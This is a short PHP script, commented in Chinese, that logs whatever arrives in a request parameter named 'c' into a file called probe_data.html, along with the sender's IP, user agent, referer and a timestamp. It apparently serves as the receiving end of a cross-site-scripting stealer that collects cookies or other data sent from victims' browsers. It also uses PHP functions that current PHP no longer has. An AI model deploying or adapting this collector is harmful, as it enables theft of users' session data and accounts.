<?php
@header("Content-Type:text/html;charset=utf-8");

function get_real_ip(){
	// 获取真实IP
	$ip=false;
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	{
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	}
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
		if ($ip)
		{
			array_unshift($ips, $ip); $ip = FALSE;
		}
		for ($i = 0; $i < count($ips); $i++)
		{
			if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i]))
			{
			$ip = $ips[$i];
			break;
			}
		}
	}
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}

function get_user_agent(){
	// 获取User-Agent
	return $_SERVER['HTTP_USER_AGENT'];
}

function get_referer(){
	// 获取Referer
	return $_SERVER['HTTP_REFERER'];
}

function quotes($content){
	if(get_magic_quotes_gpc()){
		if(is_array($content)){
			foreach($content as $key=>$value){
				$content[$key] = stripslashes($value);
			}
		}else{
			$content = stripslashes($content);}
	}else{}
	return $content;
}

if (!empty($_REQUEST["c"])){
	$curtime = date("Y-m-d H:i:s");
	$ip = get_real_ip();
	$useragent = get_user_agent();
	$referer = get_referer();
	$data = $_REQUEST["c"];
	if(!file_exists("probe_data.html")){
		$fp = fopen("probe_data.html", "a+");
		fwrite($fp, '<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>probe data</title><style>body{font-size:13px;}</style></head>');
		fclose($fp);
	}
	$fp = fopen("probe_data.html", "a+");
	fwrite($fp, "".htmlspecialchars(quotes($ip))." | $curtime <br />UserAgent: ".htmlspecialchars(quotes($useragent))." <br />Referer: ".htmlspecialchars(quotes($referer))." <br />DATA: ".htmlspecialchars(quotes($data))."<br /><br />");
	fclose($fp);
}

?>